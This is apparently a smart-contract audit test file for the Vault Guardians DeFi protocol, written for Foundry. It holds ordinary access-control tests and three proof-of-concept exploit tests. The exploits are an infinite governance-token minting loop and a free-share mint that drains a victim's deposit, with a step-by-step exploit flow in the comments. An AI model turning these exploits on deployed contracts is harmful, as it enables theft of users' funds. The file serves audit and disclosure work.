// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Base_Test} from "../../Base.t.sol";
import {console2} from "forge-std/Test.sol";
// @audit-info - Unused import
import {VaultShares} from "../../../src/protocol/VaultShares.sol";
import {ERC20Mock} from "../../mocks/ERC20Mock.sol";
import {VaultGuardians, IERC20} from "../../../src/protocol/VaultGuardians.sol";

contract VaultGuardiansTest is Base_Test {
    address user = makeAddr("user");

    uint256 mintAmount = 100 ether;

    function setUp() public override {
        Base_Test.setUp();
    }

    function testUpdateGuardianStakePrice() public {
        uint256 newStakePrice = 10;
        vm.prank(vaultGuardians.owner());
        vaultGuardians.updateGuardianStakePrice(newStakePrice);
        assertEq(vaultGuardians.getGuardianStakePrice(), newStakePrice);
    }

    function testUpdateGuardianStakePriceOnlyOwner() public {
        uint256 newStakePrice = 10;
        vm.prank(user);
        vm.expectRevert();
        vaultGuardians.updateGuardianStakePrice(newStakePrice);
    }

    function testUpdateGuardianAndDaoCut() public {
        uint256 newGuardianAndDaoCut = 10;
        vm.prank(vaultGuardians.owner());
        vaultGuardians.updateGuardianAndDaoCut(newGuardianAndDaoCut);
        assertEq(vaultGuardians.getGuardianAndDaoCut(), newGuardianAndDaoCut);
    }

    function testUpdateGuardianAndDaoCutOnlyOwner() public {
        uint256 newGuardianAndDaoCut = 10;
        vm.prank(user);
        vm.expectRevert();
        vaultGuardians.updateGuardianAndDaoCut(newGuardianAndDaoCut);
    }

    function testSweepErc20s() public {
        ERC20Mock mock = new ERC20Mock();
        mock.mint(mintAmount, msg.sender);
        vm.prank(msg.sender);
        mock.transfer(address(vaultGuardians), mintAmount);

        uint256 balanceBefore = mock.balanceOf(address(vaultGuardianGovernor));

        vm.prank(vaultGuardians.owner());
        vaultGuardians.sweepErc20s(IERC20(mock));

        uint256 balanceAfter = mock.balanceOf(address(vaultGuardianGovernor));

        assertEq(balanceAfter - balanceBefore, mintAmount);
    }


    /**
     * @notice Demonstrates a bug in UniswapAdapter where amountADesired is calculated incorrectly.
     * The logic double-counts the token amount, causing an `ERC20InsufficientBalance` revert.
     */
    function test_becomeGuardianUniswapAmountADesiredDoubled() public {
        // There is not enough hold tokens to pay the aditional tokens needed because of the bug.
        AllocationData memory allocationData = AllocationData(10, 190, 800);

        uint256 stakePrice = vaultGuardians.getGuardianStakePrice(); // 10e18
        deal(address(weth), user, stakePrice);

        vm.startPrank(user);
        weth.approve(address(vaultGuardians), stakePrice);
        vm.expectRevert();
        vaultGuardians.becomeGuardian(allocationData);
        vm.stopPrank();
    }
    /**
     * @notice PoC: Infinite Governance Token Minting.
     * Shows how to mint indefinite VGT tokens at near-zero cost.
     */
    function test_exploitInfiniteGovernanceMinting() public {
        uint256 iterations = 5;
        uint256 stakePrice = vaultGuardians.getGuardianStakePrice(); 
        
        // Setup capital for multiple iterations (covering fees)
        uint256 initialBalance = stakePrice * iterations * 2; 
        deal(address(weth), user, initialBalance);
        
        AllocationData memory allocation = AllocationData(1000, 0, 0); // 100% HOLD

        vm.startPrank(user);
        weth.approve(address(vaultGuardians), type(uint256).max);

        for (uint256 i = 0; i < iterations; i++) {
            // 1. Pay Stake -> Get VGT (Mint)
            address vaultAddr = vaultGuardians.becomeGuardian(allocation);
            VaultShares vault = VaultShares(vaultAddr);

            // 2. Recover Stake immediately (Bypass Registry/Quit)
            vault.redeem(vault.balanceOf(user), user, user);
        }
        vm.stopPrank();

        // Verification
        uint256 expectedVgt = iterations * stakePrice;
        assertEq(vaultGuardianToken.balanceOf(user), expectedVgt, "VGT should accumulate");
        
        // Attack Cost Analysis (Only DAO fees lost)
        uint256 totalCost = initialBalance - weth.balanceOf(user);
        uint256 totalVolume = stakePrice * iterations;
        console2.log("Cost to mint VGT:", totalCost);
        
        // Cost should be < 2% of volume (actually ~0.2%)
        assertLe(totalCost, totalVolume / 50, "Exploit cost is prohibitively high");
    }
    
    /*
     * @notice PoC: Critical Exploit - Free Share Minting via Missing `mint` Override.
     * 
     * TO RUN THIS POC:
     * - Go to test/mocks/AavePoolMock.sol
     * - Uncomment the import: `import {ERC20Mock} from "./ERC20Mock.sol";`
     * - Uncomment the aToken mint/burn logic in `supply()` and `withdraw()` functions
     * - Uncomment this test function
     * - Run: forge test --mt test_exploit_MintTheft -vv
     * 
     * EXPLOIT FLOW:
     * - Guardian creates vault with 100% Aave allocation.
     * - Victim deposits funds. Vault moves them to Aave.
     * - `totalAssets()` reports 0 (only reads local balance, not aTokens).
     * - Attacker calls `mint()`. Since it's NOT overridden, it uses ERC4626's `previewMint`.
     * - `previewMint` sees 0 assets -> calculates 0 cost to mint shares.
     * - Attacker gets shares for FREE.
     * - Attacker redeems shares. `redeem` IS overridden and calls `divest`, recovering funds from Aave.
     * - Attacker drains Victim's funds.
     *
     * EXPECTED RESULT: Attacker starts with 1 ETH, ends with ~11 ETH (stealing ~10 ETH from victim).
     */

    function test_exploitMintTheft() public {
        uint256 victimAmount = 10 ether;
        
        // Setup Vault with 100% Aave allocation (to ensure funds leave the vault)
        AllocationData memory aaveAllocation = AllocationData(0, 0, 1000); 
        uint256 stakePrice = vaultGuardians.getGuardianStakePrice();
        deal(address(weth), user, stakePrice);
    
        vm.startPrank(user); // Guardian
        weth.approve(address(vaultGuardians), stakePrice);
        address vaultAddr = vaultGuardians.becomeGuardian(aaveAllocation);
        VaultShares vault = VaultShares(vaultAddr);
        vm.stopPrank();
    
        // Victim Deposits
        address victim = makeAddr("victim");
        deal(address(weth), victim, victimAmount);
        vm.startPrank(victim);
        weth.approve(address(vault), victimAmount);
        vault.deposit(victimAmount, victim);
        vm.stopPrank();
        
        console2.log("Vault Balance Post Deposit:", weth.balanceOf(address(vault)));
        console2.log("Vault Total Supply:", vault.totalSupply());
        console2.log("Vault Total Assets:", vault.totalAssets());
    
        // Check State: Funds should be in Aave Mock, Vault Balance 0
        assertEq(weth.balanceOf(address(vault)), 0, "Vault should be empty (invested)");
        
        // Attacker Exploits `mint`
        address attacker = makeAddr("attacker");
        uint256 attackerInitialBalance = 1 ether;
        deal(address(weth), attacker, attackerInitialBalance); 
        
        vm.startPrank(attacker);
        weth.approve(address(vault), type(uint256).max);
        
        // Attacker mints same shares as victim (approx) to steal 50%
        uint256 sharesToMint = vault.balanceOf(victim); 
        
        console2.log("Attacker minting shares:", sharesToMint);
        console2.log("Cost expected by previewMint (should be 0):", vault.previewMint(sharesToMint));
        
        // EXECUTE MINT (Pays 0 WETH)
        vault.mint(sharesToMint, attacker);
        vm.stopPrank();
        
        // Verify Theft
        assertEq(vault.balanceOf(attacker), sharesToMint, "Attacker should have shares");
        // Attacker balance remains almost same (paid 0)
        assertGt(weth.balanceOf(attacker), attackerInitialBalance - 0.01 ether, "Attacker executed mint for free");
        
        // Attacker Redeems (Pulls funds back from Aave)
        vm.startPrank(attacker);
        vault.redeem(sharesToMint, attacker, attacker);
        vm.stopPrank();
        
        console2.log("Attacker Final Balance:", weth.balanceOf(attacker));
        // Should have Initial + ~5 ETH (Stolen)
        assertGt(weth.balanceOf(attacker), attackerInitialBalance + 4 ether, "Attacker stolen funds");
    }
}
